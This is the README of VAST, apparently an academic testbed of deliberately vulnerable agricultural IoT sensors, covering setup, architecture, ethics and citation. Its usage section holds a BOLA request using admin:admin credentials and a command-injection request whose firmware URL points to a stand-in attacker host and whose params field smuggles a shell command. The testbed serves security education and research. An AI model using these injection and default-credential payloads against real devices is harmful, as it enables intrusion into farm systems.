# VAST - Vulnerable Agricultural Sensor Testbed

## About VAST

VAST (Vulnerable Agricultural Sensor Testbed) is a containerized, vulnerable-by-design IoT framework specifically created for agricultural cybersecurity research, education, and testing. This platform simulates real-world agricultural IoT deployments while incorporating deliberate security vulnerabilities and sensor health anomalies.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://www.docker.com/)

## Features

- **Multi-layered Architecture**: Simulates complete agricultural IoT stack from sensors to gateway to client
- **Deliberate Vulnerabilities**: Implements BOLA, command injection, DDoS capability, and resource exhaustion vulnerabilities
- **Sensor Health Simulation**: Models four fault types (stuck readings, drift, spikes, and dropouts)
- **Containerized Deployment**: Complete Docker-based implementation for reproducibility across environments
- **Advanced Monitoring**: Integrated Prometheus and Grafana dashboards for security and health visualization
- **Dataset Generation**: Tools for creating LLM-ready security datasets from framework interactions
- **Agricultural Context**: Realistic temperature patterns reflecting diurnal cycles and crop-specific ranges

## Getting Started

### Prerequisites

- Docker and Docker Compose
- 4GB RAM minimum (8GB recommended)
- Basic knowledge of IoT and cybersecurity concepts

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/EmilPasca/vast.git
   cd vast
   ```

2. Build and start the containers:
   ```bash
   docker-compose -f main.docker-compose.yaml up -d
   ```

3. Start the observability stack:
   ```bash
   docker-compose -f observability/docker-compose.yaml up -d
   ```


## Usage Examples

### Basic Temperature Monitoring

Access the simulated sensor data through the gateway API:

```bash
curl http://localhost:48080/data/TEMP001
```

### Vulnerability Testing

#### BOLA Vulnerability Example

```bash
curl -u admin:admin http://localhost:48080/users/premium_user/sensors
```

#### Command Injection Example

```bash
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo TEST > /tmp/test.txt"}' \
     http://localhost:12381/firmware/update
```

#### Sensor Fault Simulation

```bash
./docs/FaultSimulation/simulate-faults.sh --sensor localhost --port 12381 --fault drift --duration 120
```

### Dataset Generation

Generate datasets for machine learning and LLM-based analysis:

```bash
cd dataset-tools
python generate_resource_exhaustion_dataset.py --sensor temperature-sensor-01 --baseline 180 --duration 300
```

## Architecture

VAST implements a multi-layered architecture mimicking real-world agricultural IoT deployments:

```
┌─────────────────┐     ┌──────────────┐     ┌───────────────┐     ┌──────────────┐
│   Data Server   │◄────│  Sensors     │────►│  MQTT Broker  │◄────│  IoT Gateway │
└─────────────────┘     └──────────────┘     └───────────────┘     └──────────────┘
                                                                          ▲
┌─────────────────┐     ┌──────────────┐                                  │
│   Prometheus    │◄────│  Grafana     │◄─────────────────────────────────┘
└─────────────────┘     └──────────────┘
```

## Documentation

Comprehensive documentation is available throughout the repository:

- **Installation**: See the [Getting Started](#getting-started) section above for installation instructions
- [Architecture Overview](supplementary-materials/README.md#relationship-to-main-paper)
- **Vulnerabilities**:
  - [BOLA Vulnerability](supplementary-materials/vulnerability-details/bola-vulnerability.md)
  - [Command Injection Vulnerability](supplementary-materials/vulnerability-details/command-injection-vulnerability.md)
  - [DDoS Vulnerability](supplementary-materials/vulnerability-details/ddos-vulnerability.md)
  - [Resource Exhaustion Vulnerability](supplementary-materials/vulnerability-details/resource-exhaustion-vulnerability.md)
- [Dataset Generation](supplementary-materials/sensor-faults-simulation.md)


## Technical Methodology

Details on our technical implementation and analytical methods:

- [Sensor Fault Simulation](supplementary-materials/sensor-faults-simulation.md)
- [Detectability Score Calculation](supplementary-materials/detectability-calculation.md)
- [Fault Masking Methodology](supplementary-materials/fault-masking-methodology.md)
- [Wireshark Analysis of Attacks](supplementary-materials/analysis/wireshark-analysis.md)

## Contributing

We welcome contributions to VAST! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details on how to submit pull requests, report issues, or request features.

## Disclaimer

VAST contains deliberately vulnerable components designed for educational purposes. Using these vulnerabilities outside of controlled educational or research environments may be illegal. The authors are not responsible for misuse of this framework.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Citation

If you use VAST in your research, please cite our paper:

```
Pasca, E.M.; Delinschi, D.; Erdei, R.; Baraian, I.; Matei, O. A Vulnerable-by-Design IoT Sensor Framework for Cybersecurity in Smart Agriculture. Agriculture 2025, X, X. https://doi.org/10.3390/xxxxx
```

## Ethical Considerations and Security Disclosure

**Important Notice**: This repository contains deliberately vulnerable code, attack implementations, and exploitation techniques designed for **educational and research purposes only**.

- **Potential for Harm**: The vulnerabilities demonstrated in this framework (BOLA, command injection, DDoS, resource exhaustion) can cause significant damage if deployed against production systems. Never deploy this code in production environments or use these techniques against systems without explicit permission.

- **Controlled Environment Use**: All testing, experimentation, and educational activities should be conducted in isolated environments completely disconnected from production networks or the internet.

- **Legal Implications**: Using these attack techniques against systems without proper authorization may violate computer crime laws in many jurisdictions, including but not limited to the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and similar legislation worldwide.

- **Responsible Disclosure**: Some implementation details have been modified or abstracted to prevent direct weaponization while maintaining educational value. However, the core concepts remain valid for understanding security vulnerabilities.

- **Academic and Educational Context**: This framework was developed to address the significant gap in agricultural IoT security education and research. Its purpose is to improve security awareness and defensive capabilities in this critical infrastructure sector.

By using this repository, you acknowledge these considerations and agree to use the knowledge and tools responsibly. The authors and contributors assume no liability for misuse of this software or the techniques it demonstrates.

## Acknowledgments

This work was supported by a grant of the Romanian National Authority for Scientific Research and Innovation, CCCDI - UEFISCDI, project number ERANET-CHISTERA-IV-TROCI 4/2024, within PNCDI IV.

This work is also supported by the project „Collaborative Framework for Smart Agriculture” – COSA that received funding from Romania’s National Recovery and Resilience Plan PNRR-III-C9-2022-I8, under grant agreement 760070.

This research has been supported by the CLOUDUT Project, cofunded by the European Fund of Regional Development through the Competitiveness Operational Programme 2014-2020, contract no. 235/2020.
